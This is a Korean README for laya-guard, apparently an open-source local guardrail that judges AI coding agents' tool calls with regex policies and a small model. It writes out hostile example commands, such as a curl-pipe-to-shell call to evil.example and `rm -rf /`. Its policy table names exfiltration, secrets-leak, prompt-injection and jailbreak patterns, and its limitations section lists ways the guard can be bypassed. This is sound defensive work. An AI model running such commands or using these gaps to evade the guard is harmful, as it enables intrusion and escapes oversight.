<p align="center"><img src="assets/logo.svg" width="128" alt="laya-guard 로고"></p>

# laya-guard — AI 코딩 에이전트용 무료 로컬 가드레일

[![ci](https://github.com/scs0209/laya-guard/actions/workflows/ci.yml/badge.svg)](https://github.com/scs0209/laya-guard/actions/workflows/ci.yml)
[![license: MIT](https://img.shields.io/badge/license-MIT-green.svg)](LICENSE)

<p align="center">
  <a href="README.md">English</a> · <strong>한국어</strong>
</p>

> **매 `tool_call`을 노트북에서 ~0.1초에 심판. 건당 과금 없음.**

**Demo KO:**
<img src="demo/demo.gif" width="750" alt="한국어 데모">

**Demo EN:**
<img src="demo/demo_en.gif" width="750" alt="English demo">

AI 코딩 에이전트는 셸을 실행하고, 돈을 움직이고, 데이터를 외부로 보냅니다. 매 스텝마다
검사해야 하지만 건당 과금 API로는 매 호출 검사가 비현실적입니다. laya-guard는 소형
다국어 모델(Laya, ~322M, Apache-2.0)로 **로컬에서** 매 호출을 심판합니다. 알려진 위험
패턴은 정규식으로 선차단하고, 나머지는 모델이 심판 → `allow` / `review` / `block`.

English: [README.md](README.md)

## 설치

```bash
pip install laya-guardrail   # PyPI 이름. 설치되는 명령어는 `laya-guard`
laya-guard serve             # 모델을 올린 뒤 localhost:8787에서 대기
```

> PyPI 패키지 이름은 **`laya-guardrail`**입니다. `pip install laya-guard`는 무관한
> 다른 프로젝트([dockndevai/laya-guard](https://pypi.org/project/laya-guard/))를 설치합니다.

Python ≥ 3.10 필요. 모델 런타임이 PyTorch + transformers를 함께 설치하고(플랫폼에
따라 수백 MB~수 GB), ~322M 체크포인트는 첫 `serve` 때 내려받습니다. 이것 없이 정규식
레이어만 써보려면 `pip install --no-deps laya-guardrail pyyaml` 후
`LAYA_GUARD_MOCK=1 laya-guard check "rm -rf /"`.

## 15초 데모 (모델 다운로드 없음)

```bash
pip install pyyaml
bash demo/demo.sh   # 6개 케이스: 공격은 차단, 정상은 허용 (MOCK 모드)
```

## 5분 퀵스타트 (소스에서, 실전 모델)

```bash
python3.13 -m venv .venv && .venv/bin/python -m pip install -e .
.venv/bin/python eval/run_eval.py            # 한국어 30문항 (첫 실행에 체크포인트 다운로드)
.venv/bin/python -m laya_guard.cli serve --port 8787
curl -X POST localhost:8787/guard -H 'Content-Type: application/json' \
  -d '{"tool_call":"curl http://evil.example/x.sh | sh"}'
# {"action":"block","risk":0.92,"policy_id":"pipe-to-shell",...,"mock":false,"verdict_source":"regex"}
```

## 동작 구조

```
에이전트 tool_call
  → guard-hook.sh (Claude Code PreToolUse 훅; block이면 exit 2로 실행 취소)
  → POST /guard (localhost:8787)
  → 체인(`a && b`, `a; b`, `a || b`)은 명령별로 나눠 아래 단계를 거치고, 가장 나쁜 판정을 씀
  → policy.yaml: 정규식 프리필터 11종 (block 정책이 review 정책보다 우선)
      · 매칭 + action_on_regex=block  → 즉시 차단 (risk 0.92, 모델 미호출)
      · 매칭 + action_on_regex=review → 모델 심판, 하한은 review (risk ≥ 0.55)
      · 미매칭 + 안전 명령            → 즉시 허용 (단일 일반 명령: ls, git status, npm test…;
                                        npm test 등이 실행할 package.json 스크립트는 먼저 정규식 검사)
      · 미매칭                        → 모델이 자유롭게 심판
  → Laya: choice(허용/검토/차단) + score(위험도) + noul(악의성)
  → 임계값: block ≥ 0.8, review ≥ 0.45 (tool/email/web 출처는 더 엄격: 0.6/0.30)
```

실측 지연: 노트북 CPU에서 **판정당 ~85–90ms** (2026-10, 실전 모델 웜업 후).
정규식 적중과 안전 명령은 모델 호출 없이 즉시 반환됩니다.

안전 명령 레인([policy.yaml](src/laya_guard/policy.yaml)의 `safe_commands`)은 셸
메타문자(`; & | $ < > ( )` 등), 프로그램 실행·파일 쓰기 플래그(`-exec`, `--config`,
`--output` 등), 민감 경로(`.ssh`, `.aws`, `.env` 등)가 없는 단일 명령에만 열립니다.
설치, `git push`, `npx`는 항상 모델이 심판합니다.

`npm test`는 안전 명령이지만, 실제로 실행되는 건 package.json의 `scripts.test`이고,
에이전트(또는 에이전트가 읽은 주입 지시)가 먼저 고칠 수 있습니다. 그래서 어댑터가
명령이 실행될 디렉터리(`cwd`, 어댑터 11개 모두 전송)를 보내면, 가드는 가장 가까운
package.json을 읽어 `npm`/`pnpm`/`yarn`의 `test`/`build`/`lint`/`run <name>`(`bun run
<name>`, `bun lint` 포함. `bun test`/`bun build`는 bun 자체 도구)에 대해
`pre<name>`, `<name>`, `post<name>`을 검사합니다. 중첩된 `npm run`과 체인 안의 `cd`도
따라갑니다. 스크립트는 모델이 아니라 정규식 정책으로만 검사합니다. 모델은 `next
build`, `vite build`, `jest` 같은 평범한 스크립트를 차단하기 때문입니다. 적중하면
정책에 따라 block 또는 review이고, reason에 `package.json scripts.test: …`가
붙습니다. 어떤 스크립트가 실행될지 알 수 없으면(`--prefix`, `--filter`, `-w`, 위치를
놓친 `cd -`, 3단계보다 깊은 중첩) review로 보냅니다.

체인은 최상위 `;`, `&&`, `||`, `&`에서만 나눕니다(따옴표, `$(…)`, 괄호 안은 그대로).
그래서 `cd app && npm test`는 안전 명령 두 개이고, `npm test && curl … | sh`는 뒷부분
때문에 차단됩니다. 전체 문자열도 정규식 검사를 거치므로 명령 경계를 넘는 패턴
(`curl -o x …; sh x`)도 잡힙니다.

## 지원 에이전트

| 에이전트 | 연동 | `review` 처리 |
|---|---|---|
| Claude Code | [PreToolUse 훅](guard-hook.sh) | 통과 (exit 0) |
| OpenCode | [`tool.execute.before` 플러그인](integrations/opencode/laya-guard.ts) | allow + stderr 경고 |
| Codex CLI | [`PreToolUse` 훅](integrations/codex/) | allow + stderr 안내 (ask 불가) |
| Cursor | [`beforeShellExecution` 훅](integrations/cursor/) | `ask` (사람 승인) |
| Kilo Code | [`tool.execute.before` 플러그인](integrations/kilo/laya-guard.ts) | allow + stderr 경고 |
| Windsurf | [`pre_run_command` 훅](integrations/windsurf/guard.py) | exit 0 + stderr 안내 |
| Cline | [`PreToolUse` 실행파일](integrations/cline/PreToolUse) | 통과 (`cancel: false`) |
| Gemini CLI | [`BeforeTool` 훅](integrations/gemini/check.py) | exit 0 + stderr 안내 |
| Qwen Code | [`PreToolUse` 훅](integrations/qwen/check.py) | `ask` (headless에선 deny) |
| Amp | [`delegate` 헬퍼](integrations/amp/permissions-helper) | exit 1 = ask |
| Copilot CLI | [`preToolUse` 훅](integrations/copilot/policy.py) | `ask` (headless에선 deny) |

훅 메커니즘이 없어 어댑터 불가: Aider, Roo Code(2026-05 종료), Continue(단계제만,
저장소 아카이브), Junie(allow/ask만). 자세히는 [integrations/](integrations/).

에이전트별 설치법: [integrations/](integrations/). `review`를 사람에게 넘기는
건 Cursor뿐입니다. 나머지는 경고 후 통과하니, 강제 승인이 필요하면 각 도구의
`permission`/`allowlist` 규칙을 함께 쓰세요.

## 사용처

### 1. Claude Code 가드 (PreToolUse 훅)

[guard-hook.sh](guard-hook.sh)를 PreToolUse 훅으로 등록하세요. tool 페이로드를
stdin으로 읽어 로컬 서버에 POST하고, `block`이면 exit 2로 해당 실행을 취소합니다.
`review`·`allow`는 exit 0으로 통과합니다. Bash 도구는 에이전트가 쓴 설명이 아니라 명령만 심판합니다. 서버에 닿지 않거나 10초 안에 답이 없으면 오프라인 검사로 대체합니다([서버 장애](#서버-장애) 참조).
[한계](#한계)를 먼저 읽어주세요. 서버 주소는 `LAYA_GUARD_URL`로 바꿀 수 있습니다.

### 2. 아무 에이전트 루프 가드 (HTTP)

매 스텝 HTTP 호출이 되는 프레임워크(OpenClaw, OpenCode, LangChain/LlamaIndex
루프, 직접 만든 하네스)는 tool 실행을 이렇게 막을 수 있습니다:

```python
import requests

def guard(tool_call: str, source: str = "tool") -> None:
    v = requests.post("http://localhost:8787/guard",
                      json={"tool_call": tool_call, "source": source},
                      timeout=60).json()
    if v["action"] == "block":
        raise RuntimeError(f"blocked by {v['policy_id']}: {v['reason']}")
    if v["action"] == "review":
        ask_human(tool_call)  # 승인 단계 연결
```

도구 결과물에서 나온 호출은 `source="email"`/`"web"`/`"tool"`로 보내면 임계값이
강화됩니다. 간접 인젝션을 막는 장치가 바로 이것입니다.

### 3. 명령 묶음 감사 (CLI)

```bash
while IFS= read -r cmd; do
  laya-guard check "$cmd" || echo "BLOCKED: $cmd"
done < commands.txt
```

(`check`는 block이면 exit 2라 `||`/`&&`·`xargs`와 조합됩니다.)

### 4. 자동화 게이트 (한국어 셋)

CI가 이미 이렇게 돕니다. `eval/run_eval.py --min-acc 1.0`은 판정 정확도가 깨지면
빌드를 실패시킵니다. 정책 수정 때도 로컬에서 같은 명령으로 검증하세요.

## 벤치마크 (재현 가능, 좋은 것만 골라내지 않음)

| 스위트 | 결과 | 명령 |
|---|---|---|
| AgentDojo v1 공격 (심판 레벨) | **25/27 차단** | `eval/run_agentdojo.py` |
| AgentDojo v1 정상 (심판 레벨) | **92/97 유지** (allow+review) | `eval/run_agentdojo.py` |
| E2E 롤아웃 (qwen2.5:7b 에이전트 + 가드) | **4/4 시나리오** (1 방어, 2 미시도, 1 정상 OK) | `eval/run_rollout.py` → [결과](eval/rollout_results.md) |
| 셸 명령 (자체: 일상 33 + 위험/우회 27, 그중 체인 10) | **58/60** (실전, `source=user`·`tool` 모두. 앞 50개는 안전 명령 레인 전 32/50·29/50) | `eval/run_eval.py --set shell` |
| 한국어 30문항 (자체) | **30/30** (MOCK·실전 모두) | `eval/run_eval.py` |

두 자체 셋은 검증 대상 규칙과 함께 만들어졌습니다(한국어 셋은 MOCK 휴리스틱과, 셸 셋은
안전 명령 레인·셸 정규식과). 정확도 주장이 아니라 회귀 게이트로 봐주세요. 외부 기준
수치는 AgentDojo입니다. 셸 셋 실패: `npx tsc --noEmit`이 검토/차단되고,
`cargo build --config` 러너 주입을 모델이 허용합니다.

놓친 2건은 문장만으로 정상 요청과 구분 불가한 캘린더 인젝션입니다 (출처 태깅이
정식 대응). 남은 오탐 5건은 대개 영어 프롬프트로, 모델이 한국어 위주로 튜닝된 탓입니다
(차단에 risk 합의를 요구한 뒤 24건에서 감소).
자세히는 [eval/](eval/) 참조.

## 텔레메트리 (계측된 도그푸딩)

매 판정은 로컬 JSONL 로그에 추가됩니다
(`~/.local/share/laya-guard/verdicts.jsonl`). **원문 `tool_call`은 절대 저장하지
않습니다.** 메타데이터(판정·risk·정책·지연시간)와 고유 프롬프트 계수용 SHA-256
앞자리만 남습니다.

```bash
laya-guard stats   # 판정 분포, block/review율, 상위 정책, 지연시간
```

`LAYA_GUARD_LOG=0`으로 끄고, `LAYA_GUARD_LOG_PATH=...`로 위치를 바꿀 수 있습니다.
집계치(원문 아님)를 공개하면 벤치 점수 옆에 붙일 실전 근거가 됩니다.

## 비교표

대부분의 가드레일은 **프롬프트 텍스트**를 검사합니다. laya-guard는 한 단계 뒤,
**에이전트가 실행하려는 tool 호출 자체**를 심판하며, 중간에 사람 승인 단계가 있습니다.

|  | laya-guard (이것) | [dockndevai/laya-guard](https://pypi.org/project/laya-guard/) | [Rebuff](https://github.com/protectai/rebuff) | [LLM Guard](https://github.com/protectai/llm-guard) | [Vigil](https://github.com/deadbits/vigil-llm) |
|---|---|---|---|---|---|
| 검사 대상 | 에이전트 tool 호출 | 고위험 명령 (MCP) | 입력 프롬프트 | 프롬프트 + 출력 | 프롬프트 + 응답 |
| 완전 로컬·무료 | ✅ 온디바이스 | ✅ 온디바이스 | ❌ OpenAI+Pinecone 키 필요 | ✅ (HF 모델) | ⚠️ 로컬 또는 OpenAI |
| 판정 | allow / **review** / block + risk | allow / confirm / block | 이진 판정 | valid + score | 점수 / 임계값 |
| 한국어 평가 | ✅ 30문항 30/30 | ❌ 확인 불가 | ❌ | ❌ | ❌ |
| AgentDojo 수치 | ✅ 25/27, 92/97 (심판 레벨, 자체 측정) | ❌ 확인 불가 | ❌ | ❌ | ❌ |
| 상태 | 개발 중, v0.2.3, MIT | MIT | ⚠️ 2025-05 아카이브 | ⚠️ 아카이브, 미유지보수 | 알파, Apache-2.0 |

이 표의 어떤 도구도 제3자 검증 AgentDojo 점수는 없습니다. 우리 수치도 자체 측정·심판
레벨입니다 ([한계](#한계) 참조).

## 정책 (11종)

| id | 잡는 것 | 정규식 적중 시 |
|---|---|---|
| `destructive-fs` | `rm -rf /`, `mkfs`, 디바이스 `dd`, 포크밤 | block |
| `pipe-to-shell` | `curl … \| sh`, `wget … \| sudo bash`, `bash -c "$(curl …)"`, `bash <(curl …)` | block |
| `exfiltration` | 터널, `nc`로 파이프, `curl -d @파일` 업로드 | review |
| `prompt-injection` | 이전 지시 무시, 탈옥, 한영 | block |
| `secrets-leak` | API 키, 개인키, 토큰 | block |
| `payment-action` | 결제/환불/청구, 한영 | review |
| `remote-exec` | 수상한 패키지 인덱스, 원격 스크립트, 로컬 내용을 셸로 파이프, 인코딩된 PS | review |
| `priv-escalation` | `sudo sh`, `chmod 777`, setuid, `/etc/`로 리다이렉트 | review |
| `persistence` | cron, 서비스 등록, 셸rc 후킹, git `core.hooksPath`/`core.pager` | review |
| `mass-delete` | `DROP TABLE`, `s3 rm --recursive`, `kubectl delete --all`, `git push --force` | review |
| `auth-bypass` | 인증/TLS 무력화, 비밀번호 초기화, 한영 | block |

패턴은 전부 [policy.yaml](src/laya_guard/policy.yaml)에 있습니다. 코드 수정 없이 추가·수정 가능.

## API

- `GET /health` → `{"ok": true, "mock": false}`
- `POST /guard` `{tool_call, source?, cwd?}` → `{action, risk, policy_id, reason, mock, verdict_source}`
  (`source`: `user` | `tool` | `email` | `web`. 비사용자 출처는 임계값 강화.
  `cwd`: 명령이 실행될 절대 경로. 주면 package.json 스크립트 검사가 켜짐.
  `reason`은 입력에 한글이 있으면 한국어, 아니면 영어로 반환.
  `verdict_source`: `regex`(정규식 선차단, 모델 미호출) |
  `allowlist`(안전 명령, 모델 미호출) | `model` |
  `heuristic`(MOCK 모드, 또는 모델 오류로 정규식+휴리스틱이 대신 판정) |
  `limit`(전체 256K자 또는 한 줄 16K자 초과, 읽지 않고 차단).
  `laya-guard check --offline --json`도 같은 형태로 `offline`을 반환.)
- `POST /v1/systemone` — Jev식 `{state, questions}` 호출용 드롭인 shim

## 설정

| 항목 | 위치 | 기본값 |
|---|---|---|
| `LAYA_GUARD_MOCK=1` | 환경변수 | off — 휴리스틱만, 모델 없음 (CI/데모용) |
| `LAYA_GUARD_DEVICE` | 환경변수 | `cpu` (결정적. `mps`는 빠르지만 재현성 포기) |
| `LAYA_GUARD_URL` | 환경변수 (훅/어댑터) | `http://localhost:8787/guard` |
| `LAYA_GUARD_FAIL` | 환경변수 (훅/어댑터) | `open` — 서버 장애 시 판정 못 한 호출은 통과, `closed`면 차단 |
| `LAYA_GUARD_BIN` | 환경변수 (훅/어댑터) | `laya-guard` — 오프라인 검사에 쓰는 CLI |
| `--no-warmup` | `laya-guard serve` | off — 서버가 대기하기 전에 모델을 먼저 올림 |
| block/review 임계값 | `policy.yaml` → `defaults` | 0.8 / 0.45 |
| 모델 체크포인트 | `policy.yaml` → `defaults.model` | `multilingual` |

## 서버 장애

모든 어댑터는 서버를 10초 기다립니다. 서버가 꺼졌거나, 오류를 내거나, 그보다 느리면
대신 `laya-guard check --offline`(정규식 + 안전 명령 레인, 모델 없음)을 실행합니다.

| 호출 | 오프라인 판정 |
|---|---|
| 정규식 정책에 적중 (block·review 등급 모두) | block |
| 안전 명령이 실행할 package.json 스크립트가 정규식 정책에 적중 | block |
| 안전 명령, 또는 안전 명령만으로 된 체인 | allow |
| 그 외 | stderr 경고 후 allow. `LAYA_GUARD_FAIL=closed`면 block |

에이전트의 `PATH`에 CLI도 없으면 `LAYA_GUARD_FAIL`만으로 결정합니다
(`LAYA_GUARD_BIN`에 전체 경로를 지정하세요. 예: `~/.venv/bin/laya-guard`).

전체 256K자 또는 한 줄 16K자를 넘는 입력은 읽지 않고 차단합니다. 일부 정규식은 한 줄
길이에 대해 제곱 시간이라, 200KB 한 줄이 48초 걸려 훅 타임아웃을 넘길 수 있었습니다.

## 한계 (신뢰하기 전에 읽어주세요)

- 서버 장애 시 정규식에도, 안전 명령에도 해당하지 않는 호출은 **기본적으로 통과**합니다
  ([서버 장애](#서버-장애)). 차단하려면 `LAYA_GUARD_FAIL=closed`를 설정하세요.
- 실행 중 모델이 실패하면 판정은 정규식+휴리스틱으로 대체됩니다. 이때
  `verdict_source: "heuristic"`으로 표시되고 경고가 로그에 남으니, 모델 판정에
  의존한다면 확인하세요.
- 안전 명령 레인은 `npm test`, `make test`, `go test` 등을 모델 없이 허용합니다.
  package.json 스크립트는 정규식으로 검사하므로(위 참고) `scripts.test`의 `curl … | sh`나
  시크릿 업로드는 잡히지만, 더 조용한 스크립트(`node -e …`, `node scripts/x.js`)는
  통과합니다. 이 명령들이 실행하는 코드는 전혀 검사하지 않습니다: 테스트 파일,
  `conftest.py`, `build.rs`, `node_modules/.bin`, Makefile 레시피(`make -n`으로 펼치면
  `$(shell …)`이 실행됨), `.npmrc`의 `script-shell`. 이 파일들의 수정은 에이전트가 쓰는
  시점에만, 파일 수정을 훅으로 받는 어댑터에서만 심판됩니다. 신경 쓰인다면
  `policy.yaml`의 `safe_commands`를 줄이세요.
- 스크립트 검사는 에이전트가 알려주는 `cwd`를 믿습니다. 에이전트의 셸이 이전 호출의
  `cd`를 유지하면서 프로젝트 루트를 보고하면 엉뚱한 package.json을 읽습니다. 어댑터
  5개(Cline, Gemini, Qwen, Kilo, Amp)는 도구 호출을 JSON으로 보내므로 안전 명령에
  해당하지 않고, 대신 모델이 심판합니다.
- 체인은 명령별로 심판하므로, 모델은 `cat shadow` 앞에 `cd /etc`가 있었다는 걸 모릅니다.
  민감 경로 검사와 전체 문자열 정규식이 흔한 경우를 막지만 전부는 아닙니다.
- 정규식 `block` 적중은 `risk: 0.92` 하드코딩을 반환합니다. 모델을 건너뛰므로 이 점수는
  보정된 확률이 아니라 플래그입니다.
- 정책별 Laya 힌트(`policy.yaml`의 `choice_hint`/`score_hint`)는 선언만 있고 의도적으로
  **미연결**입니다. 질문 instructions에 덧붙였더니 AgentDojo 공격 탐지율이 25/27 →
  14/27로 폭락했고 (오탐 감소는 전반적 관대화의 부수효과라 리버트), eval을 통과하는
  방식이 나올 때까지 제네릭 질문셋 하나로 돕니다.
- AgentDojo 수치는 **심판 레벨**입니다 (공격 문장을 기본 `source=user`로 직접 심판).
  종단간 에이전트 롤아웃이 아닙니다. 롤아웃 하네스는 `eval/run_rollout.py` 참조
  (Ollama + `qwen2.5:7b` 필요).

## 기여

PR 환영. 개발 환경, CI 게이트, 가이드라인은 [CONTRIBUTING.md](CONTRIBUTING.md)(영문)에
있고, 남은 작업은 [GitHub Issues](https://github.com/scs0209/laya-guard/issues)에 있습니다.
가장 도움이 되는 제보는 잘못 판정된 명령입니다. Missed attack 또는 Overblock 이슈 양식을
써주세요. 변경 내역은 [CHANGELOG.md](CHANGELOG.md)에 있습니다. laya-guard 자체의 취약점을
찾았다면 공개 이슈 대신 [SECURITY.md](SECURITY.md)를 따라 비공개로 제보해주세요.
이 프로젝트는 [Contributor Covenant](CODE_OF_CONDUCT.md) 행동 강령을 따릅니다.

## 라이선스

MIT — [LICENSE](LICENSE) 참조.
